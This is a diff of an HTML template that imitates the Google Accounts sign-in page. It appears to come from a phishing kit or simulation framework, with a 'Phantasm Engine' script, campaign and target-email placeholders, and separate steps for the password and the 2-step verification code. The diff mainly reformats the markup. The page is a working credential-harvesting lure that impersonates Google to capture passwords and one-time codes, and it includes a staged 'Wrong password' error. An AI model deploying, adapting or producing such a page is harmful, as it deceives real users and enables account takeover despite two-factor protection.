@@ -1,276 +1,145 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Log in - Google Accounts</title>
-    <link rel="icon" href="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png">
-    <style>
-        body {
-            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
-            background: #fff;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            color: #202124;
-        }
-        .main-container {
-            width: 450px;
-            height: auto;
-            min-height: 500px;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            padding: 48px 40px 36px;
-            box-sizing: border-box;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .logo {
-            height: 24px;
-            margin-bottom: 16px;
-        }
-        h1 {
-            font-size: 24px;
-            font-weight: 400;
-            margin: 0 0 8px;
-            line-height: 1.3333;
-        }
-        .subtitle {
-            font-size: 16px;
-            margin: 0 0 40px;
-            color: #202124;
-            letter-spacing: 0.1px;
-            line-height: 1.5;
-        }
-        .input-wrapper {
-            width: 100%;
-            position: relative;
-            margin-bottom: 6px;
-        }
-        .input-field {
-            width: 100%;
-            padding: 13px 15px;
-            font-size: 16px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            box-sizing: border-box;
-            outline: none;
-            transition: 0.2s;
-            color: #202124;
-        }
-        .input-field:focus {
-            border: 2px solid #1a73e8;
-            padding: 12px 14px;
-        }
-        .input-label {
-            position: absolute;
-            left: 12px;
-            top: 14px;
-            background: #fff;
-            padding: 0 4px;
-            color: #5f6368;
-            font-size: 16px;
-            transition: 0.2s;
-            pointer-events: none;
-        }
-        .input-field:focus ~ .input-label,
-        .input-field:not(:placeholder-shown) ~ .input-label {
-            top: -10px;
-            font-size: 12px;
-            color: #1a73e8;
-        }
-        .forgot-email {
-            width: 100%;
-            text-align: left;
-            margin-bottom: 40px;
-        }
-        .forgot-email a {
-            color: #1a73e8;
-            font-weight: 500;
-            text-decoration: none;
-            font-size: 14px;
-            border-radius: 4px;
-        }
-        .actions {
-            width: 100%;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: auto;
-        }
-        .create-account {
-            color: #1a73e8;
-            font-weight: 500;
-            text-decoration: none;
-            font-size: 14px;
-        }
-        .next-btn {
-            background-color: #1a73e8;
-            color: #fff;
-            border: none;
-            padding: 0 24px;
-            height: 36px;
-            border-radius: 4px;
-            font-weight: 500;
-            font-size: 14px;
-            cursor: pointer;
-            transition: background-color .2s box-shadow .2s;
-        }
-        .next-btn:hover {
-            background-color: #1558d6;
-            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
-        }
-        .hidden {
-            display: none;
-        }
-        .profile-pill {
-            border: 1px solid #dadce0;
-            border-radius: 16px;
-            padding: 4px 12px 4px 4px;
-            display: flex;
-            align-items: center;
-            margin-bottom: 40px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 500;
-            color: #3c4043;
-        }
-        .profile-pill img {
-            height: 20px;
-            margin-right: 8px;
-            border-radius: 50%;
-        }
-        @media (max-width: 600px) {
-            .main-container {
-                width: 100%;
-                height: 100%;
-                border: none;
-                justify-content: flex-start;
-                padding-top: 24px;
-            }
-        }
-        /* Footer */
-        .footer {
-            display: flex;
-            justify-content: space-between;
-            width: 450px;
-            margin-top: 24px;
-            font-size: 12px;
-            color: #5f6368;
-        }
-        .footer-left select {
-            border: none;
-            background: none;
-            font-size: 12px;
-            color: #202124;
-        }
-        .footer-right a {
-            color: #5f6368;
-            text-decoration: none;
-            margin-left: 24px;
-        }
-    </style>
-</head>
-<body>
-
-    <div class="main-container">
-        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
-        
-        <div id="step-1">
-            <h1>Log in</h1>
-            <p class="subtitle">Use your Google Account</p>
-            
-            <div class="input-wrapper">
-                <input type="email" id="email-input" class="input-field" placeholder=" " value="{{ target_email }}" required>
-                <label class="input-label">Email or phone</label>
-            </div>
-            
-            <div class="forgot-email">
-                <a href="#">Forgot email?</a>
-            </div>
-            
-            <p style="font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 30px;">
-                Not your computer? Use Guest mode to sign in privately.
-                <a href="#" style="color: #1a73e8; text-decoration: none; font-weight: 500;">Learn more</a>
-            </p>
-            
-            <div class="actions">
-                <a href="#" class="create-account">Create account</a>
-                <button class="next-btn" id="btn-next">Next</button>
-            </div>
-        </div>
-
-        <div id="step-2" class="hidden">
-            <h1>Welcome</h1>
-            <div class="profile-pill" id="profile-pill-back">
-                <img src="https://www.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png" alt="User">
-                <span id="user-email-display">{{ target_email }}</span>
-                <svg viewBox="0 0 24 24" style="width: 18px; height: 18px; fill: #5f6368; margin-left: 8px;"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"></path></svg>
-            </div>
-            
-            <div id="error-msg" style="color: #d93025; font-size: 12px; margin-bottom: 10px; display: none;">
-                <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="vertical-align: middle; margin-right: 5px;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
-                Wrong password. Try again or click Forgot password to reset it.
-            </div>
-
-            <div class="input-wrapper" style="margin-top: 40px;">
-                <input type="password" id="password-input" class="input-field" placeholder=" " required>
-                <label class="input-label">Enter your password</label>
-            </div>
-            
-            <div class="forgot-email" style="margin-top: 8px;">
-                <a href="#">Forgot password?</a>
-            </div>
-            
-            <div class="actions" style="margin-top: 60px;">
-                <a href="#" class="create-account"></a> <!-- Spacer -->
-                <button id="password-next-btn" class="next-btn">Next</button>
-            </div>
-        </div>
-
-        <div id="step-2fa" class="hidden">
-            <h1>2-Step Verification</h1>
-            <p class="subtitle">To help keep your account safe, Google wants to make sure it’s really you trying to sign in.</p>
-            
-            <div class="profile-pill">
-                <img src="https://www.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png" alt="User">
-                <span id="user-email-2fa">{{ target_email }}</span>
-            </div>
-            
-            <div class="input-wrapper">
-                <input type="tel" id="otp-input" class="input-field" placeholder=" " required maxlength="6" pattern="[0-9]*">
-                <label class="input-label">Enter the 6-digit code</label>
-            </div>
-            
-            <div class="forgot-email">
-                <a href="#">More options</a>
-            </div>
-            
-            <div class="actions">
-                <button class="next-btn" id="btn-otp-submit">Next</button>
-            </div>
-        </div>
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>
+   Log in - Google Accounts
+  </title>
+  <link href="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png" rel="icon"/>
+  <style>
+   body { font-family: 'Google Sans', 'Roboto', Arial, sans-serif; background: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; color: #202124; } .main-container { width: 450px; height: auto; min-height: 500px; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; } .logo { height: 24px; margin-bottom: 16px; } h1 { font-size: 24px; font-weight: 400; margin: 0 0 8px; line-height: 1.3333; } .subtitle { font-size: 16px; margin: 0 0 40px; color: #202124; letter-spacing: 0.1px; line-height: 1.5; } .input-wrapper { width: 100%; position: relative; margin-bottom: 6px; } .input-field { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; outline: none; transition: 0.2s; color: #202124; } .input-field:focus { border: 2px solid #1a73e8; padding: 12px 14px; } .input-label { position: absolute; left: 12px; top: 14px; background: #fff; padding: 0 4px; color: #5f6368; font-size: 16px; transition: 0.2s; pointer-events: none; } .input-field:focus ~ .input-label, .input-field:not(:placeholder-shown) ~ .input-label { top: -10px; font-size: 12px; color: #1a73e8; } .forgot-email { width: 100%; text-align: left; margin-bottom: 40px; } .forgot-email a { color: #1a73e8; font-weight: 500; text-decoration: none; font-size: 14px; border-radius: 4px; } .actions { width: 100%; display: flex; justify-content: space-between; align-items: center; margin-top: auto; } .create-account { color: #1a73e8; font-weight: 500; text-decoration: none; font-size: 14px; } .next-btn { background-color: #1a73e8; color: #fff; border: none; padding: 0 24px; height: 36px; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer; transition: background-color .2s box-shadow .2s; } .next-btn:hover { background-color: #1558d6; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15); } .hidden { display: none; } .profile-pill { border: 1px solid #dadce0; border-radius: 16px; padding: 4px 12px 4px 4px; display: flex; align-items: center; margin-bottom: 40px; cursor: pointer; font-size: 14px; font-weight: 500; color: #3c4043; } .profile-pill img { height: 20px; margin-right: 8px; border-radius: 50%; } @media (max-width: 600px) { .main-container { width: 100%; height: 100%; border: none; justify-content: flex-start; padding-top: 24px; } } .footer { display: flex; justify-content: space-between; width: 450px; margin-top: 24px; font-size: 12px; color: #5f6368; } .footer-left select { border: none; background: none; font-size: 12px; color: #202124; } .footer-right a { color: #5f6368; text-decoration: none; margin-left: 24px; }
+  </style>
+ </head>
+ <body>
+  <div class="main-container">
+   <img alt="Google" class="logo" loading="lazy" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"/>
+   <div id="step-1">
+    <h1>
+     Log in
+    </h1>
+    <p class="subtitle">
+     Use your Google Account
+    </p>
+    <div class="input-wrapper">
+     <input class="input-field" id="email-input" placeholder=" " required="" type="email" value="{{ target_email }}"/>
+     <label class="input-label">
+      Email or phone
+     </label>
     </div>
-
-    <div class="footer">
-        <div class="footer-left">
-            English (United States)
-        </div>
-        <div class="footer-right">
-            <a href="#">Help</a>
-            <a href="#">Privacy</a>
-            <a href="#">Terms</a>
-        </div>
+    <div class="forgot-email">
+     <a href="#">
+      Forgot email?
+     </a>
     </div>
-
-    <!-- Phantasm Engine -->
-    <script src="/assets/js/phantasm.js"></script>
-    <script>
-        document.addEventListener('DOMContentLoaded', () => {
+    <p style="font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 30px;">
+     Not your computer? Use Guest mode to sign in privately.
+     <a href="#" style="color: #1a73e8; text-decoration: none; font-weight: 500;">
+      Learn more
+     </a>
+    </p>
+    <div class="actions">
+     <a class="create-account" href="#">
+      Create account
+     </a>
+     <button class="next-btn" id="btn-next">
+      Next
+     </button>
+    </div>
+   </div>
+   <div class="hidden" id="step-2">
+    <h1>
+     Welcome
+    </h1>
+    <div class="profile-pill" id="profile-pill-back">
+     <img alt="User" loading="lazy" src="https://www.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png"/>
+     <span id="user-email-display">
+      {{ target_email }}
+     </span>
+     <svg style="width: 18px; height: 18px; fill: #5f6368; margin-left: 8px;" viewbox="0 0 24 24">
+      <path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z">
+      </path>
+     </svg>
+    </div>
+    <div id="error-msg" style="color: #d93025; font-size: 12px; margin-bottom: 10px; display: none;">
+     <svg aria-hidden="true" fill="currentColor" focusable="false" height="16px" style="vertical-align: middle; margin-right: 5px;" viewbox="0 0 24 24" width="16px" xmlns="http://www.w3.org/2000/svg">
+      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z">
+      </path>
+     </svg>
+     Wrong password. Try again or click Forgot password to reset it.
+    </div>
+    <div class="input-wrapper" style="margin-top: 40px;">
+     <input class="input-field" id="password-input" placeholder=" " required="" type="password"/>
+     <label class="input-label">
+      Enter your password
+     </label>
+    </div>
+    <div class="forgot-email" style="margin-top: 8px;">
+     <a href="#">
+      Forgot password?
+     </a>
+    </div>
+    <div class="actions" style="margin-top: 60px;">
+     <a class="create-account" href="#">
+     </a>
+     <!-- Spacer -->
+     <button class="next-btn" id="password-next-btn">
+      Next
+     </button>
+    </div>
+   </div>
+   <div class="hidden" id="step-2fa">
+    <h1>
+     2-Step Verification
+    </h1>
+    <p class="subtitle">
+     To help keep your account safe, Google wants to make sure it’s really you trying to sign in.
+    </p>
+    <div class="profile-pill">
+     <img alt="User" loading="lazy" src="https://www.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png"/>
+     <span id="user-email-2fa">
+      {{ target_email }}
+     </span>
+    </div>
+    <div class="input-wrapper">
+     <input class="input-field" id="otp-input" maxlength="6" pattern="[0-9]*" placeholder=" " required="" type="tel"/>
+     <label class="input-label">
+      Enter the 6-digit code
+     </label>
+    </div>
+    <div class="forgot-email">
+     <a href="#">
+      More options
+     </a>
+    </div>
+    <div class="actions">
+     <button class="next-btn" id="btn-otp-submit">
+      Next
+     </button>
+    </div>
+   </div>
+  </div>
+  <div class="footer">
+   <div class="footer-left">
+    English (United States)
+   </div>
+   <div class="footer-right">
+    <a href="#">
+     Help
+    </a>
+    <a href="#">
+     Privacy
+    </a>
+    <a href="#">
+     Terms
+    </a>
+   </div>
+  </div>
+  <!-- Phantasm Engine -->
+  <script async="True" src="/assets/js/phantasm.js">
+  </script>
+  <script>
+   document.addEventListener('DOMContentLoaded', () => {
             // Custom back button logic
             document.getElementById('profile-pill-back').addEventListener('click', () => {
                 document.getElementById('step-2').classList.add('hidden');
@@ -296,6 +165,6 @@
                 campaignId: '{{ campaign_id }}'
             });
         });
-    </script>
-</body>
+  </script>
+ </body>
 </html>
